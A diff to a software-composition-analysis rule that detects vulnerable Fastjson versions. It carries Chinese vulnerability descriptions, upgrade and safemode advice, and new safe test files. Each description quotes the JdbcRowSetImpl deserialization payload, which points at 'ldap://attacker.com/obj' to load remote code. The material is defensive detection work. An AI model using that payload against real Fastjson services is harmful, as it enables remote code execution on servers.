@@ -4,76 +4,61 @@ desc(
 	risk: sca
 	desc: <<<DESC
 ### 漏洞描述
-
 1. **漏洞原理**
-   Fastjson 是阿里巴巴开发的一款高性能的 JSON 库，用于 Java 应用程序中的 JSON 数据处理（序列化和反序列化）。然而，在多个版本中，Fastjson 存在反序列化漏洞。攻击者可以构造恶意的 JSON 字符串，利用 Fastjson 在进行反序列化时未对 `@type` 字段进行充分的安全校验，导致加载并执行攻击者指定的恶意类，从而实现远程代码执行（RCE）。攻击者可以利用已知的Gadget链（例如 `commons-collections`、`JdbcRowSetImpl` 等）来触发任意代码执行。
-
+Fastjson 是阿里巴巴开发的一款高性能的 JSON 库，用于 Java 应用程序中的 JSON 数据处理（序列化和反序列化）。然而，在多个版本中，Fastjson 存在反序列化漏洞。攻击者可以构造恶意的 JSON 字符串，利用 Fastjson 在进行反序列化时未对 `@type` 字段进行充分的安全校验，导致加载并执行攻击者指定的恶意类，从而实现远程代码执行（RCE）。攻击者可以利用已知的Gadget链（例如 `commons-collections`、`JdbcRowSetImpl` 等）来触发任意代码执行。
 2. **触发场景**
-   当应用程序接收并使用存在漏洞版本的 Fastjson 对外部输入的 JSON 数据进行反序列化时，就可能存在风险。常见的触发点包括：
-   - 接收并处理 HTTP 请求 Body 中的 JSON 数据。
-   - 从消息队列或文件中读取并反序列化 JSON 数据。
-   - 任何其他从不可信来源接收 JSON 数据并使用 `JSON.parseObject()` 或 `JSON.parse()` 等方法进行反序列化的地方。
-
-   **示例代码 (假设存在漏洞的版本)**:
-   ```java
-   import com.alibaba.fastjson.JSON;
-   // ...
-   String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/obj\",\"autoCommit\":true}";
-   Object obj = JSON.parse(jsonString); // 存在漏洞时，可能触发 LDAP 连接并加载执行远程代码
-   ```
-
+当应用程序接收并使用存在漏洞版本的 Fastjson 对外部输入的 JSON 数据进行反序列化时，就可能存在风险。常见的触发点包括：
+- 接收并处理 HTTP 请求 Body 中的 JSON 数据。
+- 从消息队列或文件中读取并反序列化 JSON 数据。
+- 任何其他从不可信来源接收 JSON 数据并使用 `JSON.parseObject()` 或 `JSON.parse()` 等方法进行反序列化的地方。
+**示例代码 (假设存在漏洞的版本)**:
+```java
+import com.alibaba.fastjson.JSON;
+// ...
+String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/obj\",\"autoCommit\":true}";
+Object obj = JSON.parse(jsonString); // 存在漏洞时，可能触发 LDAP 连接并加载执行远程代码
+```
 3. **潜在影响**
-   - **远程代码执行 (RCE)**: 攻击者可以在服务器上执行任意命令，完全控制受影响的系统。
-   - **服务器数据泄露与破坏**: 执行任意代码可能导致敏感数据的泄露、修改或删除。
-   - **系统权限提升**: 攻击者可能利用 RCE 漏洞进一步提升系统权限。
-   - **拒绝服务 (DoS)**: 攻击者可能通过构造特定输入导致应用程序崩溃或耗尽资源。
-
+- **远程代码执行 (RCE)**: 攻击者可以在服务器上执行任意命令，完全控制受影响的系统。
+- **服务器数据泄露与破坏**: 执行任意代码可能导致敏感数据的泄露、修改或删除。
+- **系统权限提升**: 攻击者可能利用 RCE 漏洞进一步提升系统权限。
+- **拒绝服务 (DoS)**: 攻击者可能通过构造特定输入导致应用程序崩溃或耗尽资源。
 审计此规则是为了检测项目中是否使用了存在上述反序列化漏洞的 Fastjson 版本，包括但不限于 `1.2.47`、`1.2.68` 及其之前的一些版本，以及部分 `1.2.83` 之前的版本。及时发现并升级到安全版本对于防范此类高危漏洞至关重要。
 DESC
 	rule_id: "392903f4-bed5-47fc-b913-03821fb22093"
 	solution: <<<SOLUTION
 ### 修复建议
-
 #### 1. 升级 Fastjson 版本到安全版本
 目前 Fastjson 的最新版本已经修复了已知的反序列化漏洞。根据具体情况，应尽快升级到官方推荐的安全版本。通常建议升级到 1.2.83 或更高版本。
-
 **Maven 依赖示例 (升级到安全版本)**:
 ```xml
 <dependency>
-    <groupId>com.alibaba</groupId>
-    <artifactId>fastjson</artifactId>
-    <version>1.2.83</version> <!-- 或更高版本 -->
+<groupId>com.alibaba</groupId>
+<artifactId>fastjson</artifactId>
+<version>1.2.83</version> <!-- 或更高版本 -->
 </dependency>
 ```
-
 **Gradle 依赖示例 (升级到安全版本)**:
 ```gradle
 implementation 'com.alibaba:fastjson:1.2.83' // 或更高版本
 ```
-
 #### 2. 启用安全模式 (Safemode)
 从 Fastjson 1.2.68 版本开始，引入了 `safemode` 特性，可以有效防御大多数反序列化攻击。可以通过配置启用全局 Safemode。
-
 ```java
 // 在应用程序启动时或配置加载时设置
 com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().setSafeMode(true);
 ```
-
 #### 3. 使用 `@type` 白名单限制
 如果业务场景确实需要使用 `@type` 特性进行多态反序列化，应配置全局的白名单，只允许反序列化可信的类。避免使用黑名单，因为黑名单容易被绕过。
-
 ```java
 // 添加允许反序列化的类到白名单
 com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().addAccept("com.yourcompany.yourapp.model");
 com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().addAccept("java.time."); // 示例，根据实际需求添加
-
 // 或者加载配置文件
 // com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().configFromPropety("fastjson.properties");
 ```
-
 #### 4. 避免对来自不可信源的数据使用反序列化
 尽量避免直接对来自外部、不可信来源的 JSON 数据使用 `JSON.parse()` 或 `JSON.parseObject()` 方法进行反序列化。如果必须处理外部 JSON，应严格校验输入数据的结构，或者仅反序列化为已知的、非危险的 JavaBean 对象。
-
 #### 5. 注意使用 `JSONObject` 和 `JSONArray`
 在某些场景下，如果仅需要处理简单的 JSON 结构，可以使用 `JSONObject.parseObject(jsonString)` 或 `JSONArray.parseArray(jsonString)` 方法，这些方法默认不会处理 `@type` 字段，相对更安全。但请注意，即使使用这些方法，如果内部包含复杂的嵌套结构且使用了已知的 Gadget 类名，在某些版本下仍可能存在风险，因此升级版本仍然是首要建议。
 SOLUTION
@@ -89,168 +74,141 @@ REFERENCE
 __dependency__.*alibaba*fastjson.version as $ver;
 $ver in (,1.2.47] as $vuln_1_2_47;
 alert $vuln_1_2_47 for {
-	severity: "critical",
+	level: "high",
 	cvss: "9.8",
 	message: "SCA: com.alibaba.fastjson <= 1.2.47 RCE Easy to exploit",
 	title: "SCA: Check Java Fastjson Vulnerabilities",
 	title_zh: "SCA: 检测Java Fastjson依赖漏洞",
-	solution: <<<CODE
+	solution: <<<SOLUTION
 ### 修复建议
-
 #### 1. 升级 Fastjson 版本到安全版本
 目前 Fastjson 的最新版本已经修复了已知的反序列化漏洞。根据具体情况，应尽快升级到官方推荐的安全版本。通常建议升级到 1.2.83 或更高版本。
-
 **Maven 依赖示例 (升级到安全版本)**:
 ```xml
 <dependency>
-    <groupId>com.alibaba</groupId>
-    <artifactId>fastjson</artifactId>
-    <version>1.2.83</version> <!-- 或更高版本 -->
+<groupId>com.alibaba</groupId>
+<artifactId>fastjson</artifactId>
+<version>1.2.83</version> <!-- 或更高版本 -->
 </dependency>
 ```
-
 **Gradle 依赖示例 (升级到安全版本)**:
 ```gradle
 implementation 'com.alibaba:fastjson:1.2.83' // 或更高版本
 ```
-
 #### 2. 启用安全模式 (Safemode)
 从 Fastjson 1.2.68 版本开始，引入了 `safemode` 特性，可以有效防御大多数反序列化攻击。可以通过配置启用全局 Safemode。
-
 ```java
 // 在应用程序启动时或配置加载时设置
 com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().setSafeMode(true);
 ```
-
 #### 3. 使用 `@type` 白名单限制
 如果业务场景确实需要使用 `@type` 特性进行多态反序列化，应配置全局的白名单，只允许反序列化可信的类。避免使用黑名单，因为黑名单容易被绕过。
-
 ```java
 // 添加允许反序列化的类到白名单
 com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().addAccept("com.yourcompany.yourapp.model");
 com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().addAccept("java.time."); // 示例，根据实际需求添加
-
 // 或者加载配置文件
 // com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().configFromPropety("fastjson.properties");
 ```
-
 #### 4. 避免对来自不可信源的数据使用反序列化
 尽量避免直接对来自外部、不可信来源的 JSON 数据使用 `JSON.parse()` 或 `JSON.parseObject()` 方法进行反序列化。如果必须处理外部 JSON，应严格校验输入数据的结构，或者仅反序列化为已知的、非危险的 JavaBean 对象。
-
 #### 5. 注意使用 `JSONObject` 和 `JSONArray`
 在某些场景下，如果仅需要处理简单的 JSON 结构，可以使用 `JSONObject.parseObject(jsonString)` 或 `JSONArray.parseArray(jsonString)` 方法，这些方法默认不会处理 `@type` 字段，相对更安全。但请注意，即使使用这些方法，如果内部包含复杂的嵌套结构且使用了已知的 Gadget 类名，在某些版本下仍可能存在风险，因此升级版本仍然是首要建议。
-CODE
-	desc: <<<CODE
+SOLUTION
+	desc: <<<DESC
 ### 漏洞描述
-
 1. **漏洞原理**
-   Fastjson 是阿里巴巴开发的一款高性能的 JSON 库，用于 Java 应用程序中的 JSON 数据处理（序列化和反序列化）。然而，在多个版本中，Fastjson 存在反序列化漏洞。攻击者可以构造恶意的 JSON 字符串，利用 Fastjson 在进行反序列化时未对 `@type` 字段进行充分的安全校验，导致加载并执行攻击者指定的恶意类，从而实现远程代码执行（RCE）。攻击者可以利用已知的Gadget链（例如 `commons-collections`、`JdbcRowSetImpl` 等）来触发任意代码执行。
-
+Fastjson 是阿里巴巴开发的一款高性能的 JSON 库，用于 Java 应用程序中的 JSON 数据处理（序列化和反序列化）。然而，在多个版本中，Fastjson 存在反序列化漏洞。攻击者可以构造恶意的 JSON 字符串，利用 Fastjson 在进行反序列化时未对 `@type` 字段进行充分的安全校验，导致加载并执行攻击者指定的恶意类，从而实现远程代码执行（RCE）。攻击者可以利用已知的Gadget链（例如 `commons-collections`、`JdbcRowSetImpl` 等）来触发任意代码执行。
 2. **触发场景**
-   当应用程序接收并使用存在漏洞版本的 Fastjson 对外部输入的 JSON 数据进行反序列化时，就可能存在风险。常见的触发点包括：
-   - 接收并处理 HTTP 请求 Body 中的 JSON 数据。
-   - 从消息队列或文件中读取并反序列化 JSON 数据。
-   - 任何其他从不可信来源接收 JSON 数据并使用 `JSON.parseObject()` 或 `JSON.parse()` 等方法进行反序列化的地方。
-
-   **示例代码 (假设存在漏洞的版本)**:
-   ```java
-   import com.alibaba.fastjson.JSON;
-   // ...
-   String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/obj\",\"autoCommit\":true}";
-   Object obj = JSON.parse(jsonString); // 存在漏洞时，可能触发 LDAP 连接并加载执行远程代码
-   ```
-
+当应用程序接收并使用存在漏洞版本的 Fastjson 对外部输入的 JSON 数据进行反序列化时，就可能存在风险。常见的触发点包括：
+- 接收并处理 HTTP 请求 Body 中的 JSON 数据。
+- 从消息队列或文件中读取并反序列化 JSON 数据。
+- 任何其他从不可信来源接收 JSON 数据并使用 `JSON.parseObject()` 或 `JSON.parse()` 等方法进行反序列化的地方。
+**示例代码 (假设存在漏洞的版本)**:
+```java
+import com.alibaba.fastjson.JSON;
+// ...
+String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/obj\",\"autoCommit\":true}";
+Object obj = JSON.parse(jsonString); // 存在漏洞时，可能触发 LDAP 连接并加载执行远程代码
+```
 3. **潜在影响**
-   - **远程代码执行 (RCE)**: 攻击者可以在服务器上执行任意命令，完全控制受影响的系统。
-   - **服务器数据泄露与破坏**: 执行任意代码可能导致敏感数据的泄露、修改或删除。
-   - **系统权限提升**: 攻击者可能利用 RCE 漏洞进一步提升系统权限。
-   - **拒绝服务 (DoS)**: 攻击者可能通过构造特定输入导致应用程序崩溃或耗尽资源。
-
+- **远程代码执行 (RCE)**: 攻击者可以在服务器上执行任意命令，完全控制受影响的系统。
+- **服务器数据泄露与破坏**: 执行任意代码可能导致敏感数据的泄露、修改或删除。
+- **系统权限提升**: 攻击者可能利用 RCE 漏洞进一步提升系统权限。
+- **拒绝服务 (DoS)**: 攻击者可能通过构造特定输入导致应用程序崩溃或耗尽资源。
 审计此规则是为了检测项目中是否使用了存在上述反序列化漏洞的 Fastjson 版本，包括但不限于 `1.2.47`、`1.2.68` 及其之前的一些版本，以及部分 `1.2.83` 之前的版本。及时发现并升级到安全版本对于防范此类高危漏洞至关重要。
-CODE
-	level: "high",
+DESC
+	name: "vuln_1_2_47",
+	risk: "SCA",
 }
 
 $ver in (,1.2.68] as $vuln_1_2_68;
 alert $vuln_1_2_68 for {
 	title_zh: "SCA: 检测Java Fastjson依赖漏洞",
-	solution: <<<CODE
+	solution: <<<SOLUTION
 ### 修复建议
-
 #### 1. 升级 Fastjson 版本到安全版本
 目前 Fastjson 的最新版本已经修复了已知的反序列化漏洞。根据具体情况，应尽快升级到官方推荐的安全版本。通常建议升级到 1.2.83 或更高版本。
-
 **Maven 依赖示例 (升级到安全版本)**:
 ```xml
 <dependency>
-    <groupId>com.alibaba</groupId>
-    <artifactId>fastjson</artifactId>
-    <version>1.2.83</version> <!-- 或更高版本 -->
+<groupId>com.alibaba</groupId>
+<artifactId>fastjson</artifactId>
+<version>1.2.83</version> <!-- 或更高版本 -->
 </dependency>
 ```
-
 **Gradle 依赖示例 (升级到安全版本)**:
 ```gradle
 implementation 'com.alibaba:fastjson:1.2.83' // 或更高版本
 ```
-
 #### 2. 启用安全模式 (Safemode)
 从 Fastjson 1.2.68 版本开始，引入了 `safemode` 特性，可以有效防御大多数反序列化攻击。可以通过配置启用全局 Safemode。
-
 ```java
 // 在应用程序启动时或配置加载时设置
 com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().setSafeMode(true);
 ```
-
 #### 3. 使用 `@type` 白名单限制
 如果业务场景确实需要使用 `@type` 特性进行多态反序列化，应配置全局的白名单，只允许反序列化可信的类。避免使用黑名单，因为黑名单容易被绕过。
-
 ```java
 // 添加允许反序列化的类到白名单
 com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().addAccept("com.yourcompany.yourapp.model");
 com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().addAccept("java.time."); // 示例，根据实际需求添加
-
 // 或者加载配置文件
 // com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().configFromPropety("fastjson.properties");
 ```
-
 #### 4. 避免对来自不可信源的数据使用反序列化
 尽量避免直接对来自外部、不可信来源的 JSON 数据使用 `JSON.parse()` 或 `JSON.parseObject()` 方法进行反序列化。如果必须处理外部 JSON，应严格校验输入数据的结构，或者仅反序列化为已知的、非危险的 JavaBean 对象。
-
 #### 5. 注意使用 `JSONObject` 和 `JSONArray`
 在某些场景下，如果仅需要处理简单的 JSON 结构，可以使用 `JSONObject.parseObject(jsonString)` 或 `JSONArray.parseArray(jsonString)` 方法，这些方法默认不会处理 `@type` 字段，相对更安全。但请注意，即使使用这些方法，如果内部包含复杂的嵌套结构且使用了已知的 Gadget 类名，在某些版本下仍可能存在风险，因此升级版本仍然是首要建议。
-CODE
-	desc: <<<CODE
+SOLUTION
+	desc: <<<DESC
 ### 漏洞描述
-
 1. **漏洞原理**
-   Fastjson 是阿里巴巴开发的一款高性能的 JSON 库，用于 Java 应用程序中的 JSON 数据处理（序列化和反序列化）。然而，在多个版本中，Fastjson 存在反序列化漏洞。攻击者可以构造恶意的 JSON 字符串，利用 Fastjson 在进行反序列化时未对 `@type` 字段进行充分的安全校验，导致加载并执行攻击者指定的恶意类，从而实现远程代码执行（RCE）。攻击者可以利用已知的Gadget链（例如 `commons-collections`、`JdbcRowSetImpl` 等）来触发任意代码执行。
-
+Fastjson 是阿里巴巴开发的一款高性能的 JSON 库，用于 Java 应用程序中的 JSON 数据处理（序列化和反序列化）。然而，在多个版本中，Fastjson 存在反序列化漏洞。攻击者可以构造恶意的 JSON 字符串，利用 Fastjson 在进行反序列化时未对 `@type` 字段进行充分的安全校验，导致加载并执行攻击者指定的恶意类，从而实现远程代码执行（RCE）。攻击者可以利用已知的Gadget链（例如 `commons-collections`、`JdbcRowSetImpl` 等）来触发任意代码执行。
 2. **触发场景**
-   当应用程序接收并使用存在漏洞版本的 Fastjson 对外部输入的 JSON 数据进行反序列化时，就可能存在风险。常见的触发点包括：
-   - 接收并处理 HTTP 请求 Body 中的 JSON 数据。
-   - 从消息队列或文件中读取并反序列化 JSON 数据。
-   - 任何其他从不可信来源接收 JSON 数据并使用 `JSON.parseObject()` 或 `JSON.parse()` 等方法进行反序列化的地方。
-
-   **示例代码 (假设存在漏洞的版本)**:
-   ```java
-   import com.alibaba.fastjson.JSON;
-   // ...
-   String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/obj\",\"autoCommit\":true}";
-   Object obj = JSON.parse(jsonString); // 存在漏洞时，可能触发 LDAP 连接并加载执行远程代码
-   ```
-
+当应用程序接收并使用存在漏洞版本的 Fastjson 对外部输入的 JSON 数据进行反序列化时，就可能存在风险。常见的触发点包括：
+- 接收并处理 HTTP 请求 Body 中的 JSON 数据。
+- 从消息队列或文件中读取并反序列化 JSON 数据。
+- 任何其他从不可信来源接收 JSON 数据并使用 `JSON.parseObject()` 或 `JSON.parse()` 等方法进行反序列化的地方。
+**示例代码 (假设存在漏洞的版本)**:
+```java
+import com.alibaba.fastjson.JSON;
+// ...
+String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/obj\",\"autoCommit\":true}";
+Object obj = JSON.parse(jsonString); // 存在漏洞时，可能触发 LDAP 连接并加载执行远程代码
+```
 3. **潜在影响**
-   - **远程代码执行 (RCE)**: 攻击者可以在服务器上执行任意命令，完全控制受影响的系统。
-   - **服务器数据泄露与破坏**: 执行任意代码可能导致敏感数据的泄露、修改或删除。
-   - **系统权限提升**: 攻击者可能利用 RCE 漏洞进一步提升系统权限。
-   - **拒绝服务 (DoS)**: 攻击者可能通过构造特定输入导致应用程序崩溃或耗尽资源。
-
+- **远程代码执行 (RCE)**: 攻击者可以在服务器上执行任意命令，完全控制受影响的系统。
+- **服务器数据泄露与破坏**: 执行任意代码可能导致敏感数据的泄露、修改或删除。
+- **系统权限提升**: 攻击者可能利用 RCE 漏洞进一步提升系统权限。
+- **拒绝服务 (DoS)**: 攻击者可能通过构造特定输入导致应用程序崩溃或耗尽资源。
 审计此规则是为了检测项目中是否使用了存在上述反序列化漏洞的 Fastjson 版本，包括但不限于 `1.2.47`、`1.2.68` 及其之前的一些版本，以及部分 `1.2.83` 之前的版本。及时发现并升级到安全版本对于防范此类高危漏洞至关重要。
-CODE
+DESC
 	level: "critical",
 	message: "SCA: com.alibaba.fastjson <= 1.2.68 RCE Mid to exploit",
 	title: "SCA: Check Java Fastjson Vulnerabilities",
+	risk: "SCA",
+	name: "vuln_1_2_68",
 }
 
 $ver in (,1.2.83) as $vuln_1_2_80;
@@ -258,81 +216,68 @@ alert $vuln_1_2_80 for {
 	message: "SCA: com.alibaba.fastjson < 1.2.83 RCE Hard to exploit",
 	title: "SCA: Check Java Fastjson Vulnerabilities",
 	title_zh: "SCA: 检测Java Fastjson依赖漏洞",
-	solution: <<<CODE
+	solution: <<<SOLUTION
 ### 修复建议
-
 #### 1. 升级 Fastjson 版本到安全版本
 目前 Fastjson 的最新版本已经修复了已知的反序列化漏洞。根据具体情况，应尽快升级到官方推荐的安全版本。通常建议升级到 1.2.83 或更高版本。
-
 **Maven 依赖示例 (升级到安全版本)**:
 ```xml
 <dependency>
-    <groupId>com.alibaba</groupId>
-    <artifactId>fastjson</artifactId>
-    <version>1.2.83</version> <!-- 或更高版本 -->
+<groupId>com.alibaba</groupId>
+<artifactId>fastjson</artifactId>
+<version>1.2.83</version> <!-- 或更高版本 -->
 </dependency>
 ```
-
 **Gradle 依赖示例 (升级到安全版本)**:
 ```gradle
 implementation 'com.alibaba:fastjson:1.2.83' // 或更高版本
 ```
-
 #### 2. 启用安全模式 (Safemode)
 从 Fastjson 1.2.68 版本开始，引入了 `safemode` 特性，可以有效防御大多数反序列化攻击。可以通过配置启用全局 Safemode。
-
 ```java
 // 在应用程序启动时或配置加载时设置
 com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().setSafeMode(true);
 ```
-
 #### 3. 使用 `@type` 白名单限制
 如果业务场景确实需要使用 `@type` 特性进行多态反序列化，应配置全局的白名单，只允许反序列化可信的类。避免使用黑名单，因为黑名单容易被绕过。
-
 ```java
 // 添加允许反序列化的类到白名单
 com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().addAccept("com.yourcompany.yourapp.model");
 com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().addAccept("java.time."); // 示例，根据实际需求添加
-
 // 或者加载配置文件
 // com.alibaba.fastjson.parser.ParserConfig.getGlobalInstance().configFromPropety("fastjson.properties");
 ```
-
 #### 4. 避免对来自不可信源的数据使用反序列化
 尽量避免直接对来自外部、不可信来源的 JSON 数据使用 `JSON.parse()` 或 `JSON.parseObject()` 方法进行反序列化。如果必须处理外部 JSON，应严格校验输入数据的结构，或者仅反序列化为已知的、非危险的 JavaBean 对象。
-
 #### 5. 注意使用 `JSONObject` 和 `JSONArray`
 在某些场景下，如果仅需要处理简单的 JSON 结构，可以使用 `JSONObject.parseObject(jsonString)` 或 `JSONArray.parseArray(jsonString)` 方法，这些方法默认不会处理 `@type` 字段，相对更安全。但请注意，即使使用这些方法，如果内部包含复杂的嵌套结构且使用了已知的 Gadget 类名，在某些版本下仍可能存在风险，因此升级版本仍然是首要建议。
-CODE
-	desc: <<<CODE
+SOLUTION
+	desc: <<<DESC
 ### 漏洞描述
-
 1. **漏洞原理**
-   Fastjson 是阿里巴巴开发的一款高性能的 JSON 库，用于 Java 应用程序中的 JSON 数据处理（序列化和反序列化）。然而，在多个版本中，Fastjson 存在反序列化漏洞。攻击者可以构造恶意的 JSON 字符串，利用 Fastjson 在进行反序列化时未对 `@type` 字段进行充分的安全校验，导致加载并执行攻击者指定的恶意类，从而实现远程代码执行（RCE）。攻击者可以利用已知的Gadget链（例如 `commons-collections`、`JdbcRowSetImpl` 等）来触发任意代码执行。
-
+Fastjson 是阿里巴巴开发的一款高性能的 JSON 库，用于 Java 应用程序中的 JSON 数据处理（序列化和反序列化）。然而，在多个版本中，Fastjson 存在反序列化漏洞。攻击者可以构造恶意的 JSON 字符串，利用 Fastjson 在进行反序列化时未对 `@type` 字段进行充分的安全校验，导致加载并执行攻击者指定的恶意类，从而实现远程代码执行（RCE）。攻击者可以利用已知的Gadget链（例如 `commons-collections`、`JdbcRowSetImpl` 等）来触发任意代码执行。
 2. **触发场景**
-   当应用程序接收并使用存在漏洞版本的 Fastjson 对外部输入的 JSON 数据进行反序列化时，就可能存在风险。常见的触发点包括：
-   - 接收并处理 HTTP 请求 Body 中的 JSON 数据。
-   - 从消息队列或文件中读取并反序列化 JSON 数据。
-   - 任何其他从不可信来源接收 JSON 数据并使用 `JSON.parseObject()` 或 `JSON.parse()` 等方法进行反序列化的地方。
-
-   **示例代码 (假设存在漏洞的版本)**:
-   ```java
-   import com.alibaba.fastjson.JSON;
-   // ...
-   String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/obj\",\"autoCommit\":true}";
-   Object obj = JSON.parse(jsonString); // 存在漏洞时，可能触发 LDAP 连接并加载执行远程代码
-   ```
-
+当应用程序接收并使用存在漏洞版本的 Fastjson 对外部输入的 JSON 数据进行反序列化时，就可能存在风险。常见的触发点包括：
+- 接收并处理 HTTP 请求 Body 中的 JSON 数据。
+- 从消息队列或文件中读取并反序列化 JSON 数据。
+- 任何其他从不可信来源接收 JSON 数据并使用 `JSON.parseObject()` 或 `JSON.parse()` 等方法进行反序列化的地方。
+**示例代码 (假设存在漏洞的版本)**:
+```java
+import com.alibaba.fastjson.JSON;
+// ...
+String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/obj\",\"autoCommit\":true}";
+Object obj = JSON.parse(jsonString); // 存在漏洞时，可能触发 LDAP 连接并加载执行远程代码
+```
 3. **潜在影响**
-   - **远程代码执行 (RCE)**: 攻击者可以在服务器上执行任意命令，完全控制受影响的系统。
-   - **服务器数据泄露与破坏**: 执行任意代码可能导致敏感数据的泄露、修改或删除。
-   - **系统权限提升**: 攻击者可能利用 RCE 漏洞进一步提升系统权限。
-   - **拒绝服务 (DoS)**: 攻击者可能通过构造特定输入导致应用程序崩溃或耗尽资源。
-
+- **远程代码执行 (RCE)**: 攻击者可以在服务器上执行任意命令，完全控制受影响的系统。
+- **服务器数据泄露与破坏**: 执行任意代码可能导致敏感数据的泄露、修改或删除。
+- **系统权限提升**: 攻击者可能利用 RCE 漏洞进一步提升系统权限。
+- **拒绝服务 (DoS)**: 攻击者可能通过构造特定输入导致应用程序崩溃或耗尽资源。
 审计此规则是为了检测项目中是否使用了存在上述反序列化漏洞的 Fastjson 版本，包括但不限于 `1.2.47`、`1.2.68` 及其之前的一些版本，以及部分 `1.2.83` 之前的版本。及时发现并升级到安全版本对于防范此类高危漏洞至关重要。
-CODE
+DESC
 	level: "critical",
+	risk: "SCA",
+	name: "vuln_1_2_80",
 }
 
 
@@ -383,4 +328,95 @@ AAA
     </dependencies>
 </project>
 AAA
+	"safefile://SafeFastjsonUsage.java": <<<CODE
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+
+public class SafeFastjsonUsage {
+
+    static {
+        // 推荐：在应用程序启动时全局启用 Safemode
+        // 此配置在 Fastjson 1.2.68 及更高版本中可用，可以有效防御大多数反序列化攻击。
+        ParserConfig.getGlobalInstance().setSafeMode(true);
+    }
+
+    public static void main(String[] args) {
+        // 示例：使用安全版本的 Fastjson (1.2.83+)
+        // 该版本已修复已知反序列化漏洞
+        String safeJsonString = "{\"name\":\"test\", \"age\":18}";
+        User user = JSON.parseObject(safeJsonString, User.class);
+        System.out.println("Parsed user (safe version): " + user.getName() + ", " + user.getAge());
+
+        // 示例：仅使用 JSONObject 处理简单JSON结构，不涉及@type
+        // 这种使用方式相对更安全，但仍建议升级Fastjson版本。
+        String simpleJson = "{\"key\":\"value\"}";
+        com.alibaba.fastjson.JSONObject jsonObject = JSON.parseObject(simpleJson);
+        System.out.println("Parsed JSONObject: " + jsonObject.getString("key"));
+
+        // 示例：使用Fastjson序列化，通常不会引入反序列化漏洞
+        User newUser = new User("Alice", 25);
+        String serializedUser = JSON.toJSONString(newUser, SerializerFeature.WriteMapNullValue);
+        System.out.println("Serialized user: " + serializedUser);
+
+        // 示例：Fastjson反序列化到明确的JavaBean，而不是泛型Object
+        // 且仅处理来自可信来源的JSON
+        String trustedJson = "{\"name\":\"Bob\", \"age\":30}";
+        User trustedUser = JSON.parseObject(trustedJson, User.class);
+        System.out.println("Parsed trusted user: " + trustedUser.getName() + ", " + trustedUser.getAge());
+
+        System.out.println("Fastjson safemode status: " + ParserConfig.getGlobalInstance().isSafeMode());
+    }
+
+    // 示例用户类
+    public static class User {
+        private String name;
+        private int age;
+
+        public User() {}
+
+        public User(String name, int age) {
+            this.name = name;
+            this.age = age;
+        }
+
+        public String getName() {
+            return name;
+        }
+
+        public void setName(String name) {
+            this.name = name;
+        }
+
+        public int getAge() {
+            return age;
+        }
+
+        public void setAge(int age) {
+            this.age = age;
+        }
+    }
+}
+CODE
+	"safefile://SafeFastjsonMavenConfig.xml": <<<CODE
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+
+    <groupId>com.example</groupId>
+    <artifactId>secure-fastjson-app</artifactId>
+    <version>1.0-SNAPSHOT</version>
+
+    <dependencies>
+        <!-- Fastjson dependency, upgraded to a safe version (e.g., 1.2.83 or higher) -->
+        <dependency>
+            <groupId>com.alibaba</groupId>
+            <artifactId>fastjson</artifactId>
+            <version>1.2.83</version> <!-- 这是推荐的安全版本，或更高版本 -->
+        </dependency>
+    </dependencies>
+</project>
+CODE
 )
